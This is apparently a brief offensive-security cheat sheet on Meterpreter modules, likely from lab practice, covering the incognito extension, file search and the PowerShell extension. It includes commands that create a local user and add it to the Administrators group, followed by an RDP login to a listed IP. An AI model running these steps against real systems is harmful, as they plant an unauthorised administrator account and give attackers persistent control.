# Meterpreter

## Modules

### incognito

```
meterpreter > load incognito 
```

Create User
```
PS C:\windows\temp> ./incognito.exe add_user username password
PS C:\windows\temp> ./incognito.exe add_localgroup_user Administrators username

rdesktop -g 90% -u username -p password 10.10.151.159
```

## Search 

```
meterpreter > search -h
Usage: search [-d dir] [-r recurse] -f pattern
Search for files.
```

## Powershell

```console
meterpreter > load powershell                                                                                                                                      
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > whoami /priv
```